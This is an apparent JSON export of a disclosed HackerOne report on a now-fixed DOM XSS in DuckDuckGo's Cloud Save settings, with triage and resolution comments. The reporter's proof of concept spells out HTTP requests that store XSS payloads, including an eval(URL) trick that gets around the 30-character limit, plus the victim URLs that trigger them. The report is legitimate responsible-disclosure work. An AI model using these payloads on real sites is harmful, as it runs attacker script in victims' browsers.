{"id":921635,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjE2MzU=","url":"https://hackerone.com/reports/921635","title":"DOM XSS on duckduckgo.com search","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-07-12T18:07:27.265Z","submitted_at":"2020-07-12T18:07:27.265Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sijisu","url":"/sijisu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ifesz31kDzdrxysGYipHkzRB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":10995,"url":"https://hackerone.com/duckduckgo","handle":"duckduckgo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"DuckDuckGo","twitter_handle":"duckduckgo","website":"https://duckduckgo.com","about":"DuckDuckGo is the Internet privacy company for everyone who's had enough of hidden online tracking."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-20T15:49:37.725Z","bug_reporter_agreed_on_going_public_at":"2020-07-21T15:49:33.955Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey there,\n\nthere is a DOM XXS vulnerability on the https://duckduckgo.com/ search result page through the `kp` and `kae` parameters of the [Cloud Save](https://help.duckduckgo.com/duckduckgo-help-pages/settings/cloud-save/) feature.\n\nPOC URL: https://duckduckgo.com/?q=s\u0026key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070325\n\nVideo (Firefox 78.0.1): \n{F904609}\n\nVideo (Chromium 83.0.4103.116): \n{F904637}\n\n## How to reproduce?\n\nFirst, we need to create malicious \"Cloud Save\" setting with our XSS payloads, an attacker would do that on their computer, we can do that with the following request to duckduckgo.com:\n\n```\nPOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 248\n\n{\n\"command\":\"write\",\n\"objectKey\":\"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff\",\n\"obj\":{\n\"kp\":\"\\\"\u003e\u003cimg src=/ onerror=alert(1)\u003e\",\n\"kae\":\"\\\"\u003e\u003cimg src=/ onerror=alert(2)\u003e\"\n}\n}\n```\n\nNow we just need to visit duckduckgo.com with the key parameter set, an attacker would send this link to the victim, like this: https://duckduckgo.com/?q=a\u0026key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff. The Cloud Save key is now saved in the browser's Local Storage. Because the settings are downloaded from Cloud Save on every visit of the results page, our code will be executed every time as well. Try searching https://duckduckgo.com/?q=a, it even triggers on the settings page https://duckduckgo.com/settings and others.\n\n## What about longer payloads?\n\nYou cannot have Cloud Save settings property longer than 30 characters. However, there are many tricks on how to bypass this limitation. For example one of many great @terjanq 's payloads does the trick here. It evals the URL so you can make your payload long enough to execute malicious code.\n\nRequest to set up Cloud Save:\n\n```\nPOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 211\n\n{\n\"command\":\"write\",\n\"objectKey\":\"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324\",\n\"obj\":{\n\"kp\":\"\\\"\u003e\u003csvg/onload=eval(`'`+URL)\u003e\"\n}\n}\n```\n\nAnd URL that executes the code: https://duckduckgo.com/?q=s\u0026key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324#';alert(document.domain);\n\nVideo:\n{F904653}\n\n## Impact\n\nAttacker can execute JavaScript.","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":904609,"file_name":"firefox2-2020-07-12_19.04.05.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sdWcfWmVDwrLLrwa4NRCf7nK?response-content-disposition=attachment%3B%20filename%3D%22firefox2-2020-07-12_19.04.05.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox2-2020-07-12_19.04.05.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154224Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=01c7fed0361c9d96059e5f289061ef44a29e780aaba70c673fdc2cb0f35a0b74","file_size":1799206,"type":"video/mp4"},{"id":904637,"file_name":"chromium2-2020-07-12_19.36.47.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ytuzBbf82jA7u61ALBTsiZW3?response-content-disposition=attachment%3B%20filename%3D%22chromium2-2020-07-12_19.36.47.mp4%22%3B%20filename%2A%3DUTF-8%27%27chromium2-2020-07-12_19.36.47.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154224Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b8c6bab5e92ab306110e4c088b1d7a9d2848dda702f7462b09c6a6ef1db048c8","file_size":1535136,"type":"video/mp4"},{"id":904653,"file_name":"firefox3-2020-07-12_19.59.04.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wRgY6vRS32iwaTEVvrsPM8Ut?response-content-disposition=attachment%3B%20filename%3D%22firefox3-2020-07-12_19.59.04.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox3-2020-07-12_19.59.04.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154224Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e8c3d2a0987e65e84cddffd51c03e2c5bbd25c28effd74b3f1b5aba93407585d","file_size":451306,"type":"video/mp4"}],"allow_singular_disclosure_at":"2020-08-20T15:49:34.022Z","allow_singular_disclosure_after":-36028370.48990267,"singular_disclosure_allowed":true,"vote_count":30,"voters":["canarinho_pistola","xploiterr","secator","spam404","leonishan","3x3s","sa1tama0","linuxinet","jesuser14","geminied","and 20 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":8671,"asset_type":"URL","asset_identifier":"*.duckduckgo.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8580464,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-07-13T10:10:30.438Z","updated_at":"2020-07-13T10:10:30.438Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":777075,"new_severity_id":777958},"actor":{"username":"lugtag","cleared":false,"url":"/lugtag","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/gKtXsNkprE7ekgjBwpwWpTzX/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8580466,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @sijisu,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@lugtag","automated_response":false,"created_at":"2020-07-13T10:10:36.717Z","updated_at":"2020-07-13T10:10:36.717Z","actor":{"username":"lugtag","cleared":false,"url":"/lugtag","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/gKtXsNkprE7ekgjBwpwWpTzX/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8664199,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sijisu, thanks for the report.\nThis should be fixed now, can you confirm?","automated_response":false,"created_at":"2020-07-21T14:20:17.974Z","updated_at":"2020-07-21T14:20:17.974Z","actor":{"username":"mariag","cleared":false,"url":"/mariag","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8664552,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @mariag,\n\nlooks fixed to me. The PoC URL doesn't work anymore.\n\nRegards,\n@sijisu","automated_response":false,"created_at":"2020-07-21T14:59:01.686Z","updated_at":"2020-07-21T14:59:01.686Z","actor":{"username":"sijisu","cleared":false,"url":"/sijisu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ifesz31kDzdrxysGYipHkzRB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8665484,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","automated_response":false,"created_at":"2020-07-21T15:42:03.815Z","updated_at":"2020-07-21T15:42:03.815Z","actor":{"url":"/duckduckgo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"DuckDuckGo"}},"reporter":{"username":"sijisu","url":"/sijisu"},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8665487,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-07-21T15:42:13.217Z","updated_at":"2020-07-21T15:42:13.217Z","actor":{"username":"mariag","cleared":false,"url":"/mariag","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sijisu","url":"/sijisu"},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8665544,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you for the swag! Can we disclose this now?","automated_response":false,"created_at":"2020-07-21T15:49:33.974Z","updated_at":"2020-07-21T15:49:33.974Z","first_to_agree":true,"actor":{"username":"sijisu","cleared":false,"url":"/sijisu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ifesz31kDzdrxysGYipHkzRB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8990669,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-20T15:49:37.751Z","updated_at":"2020-08-20T15:49:37.751Z","actor":{"url":"/duckduckgo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"DuckDuckGo"}},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}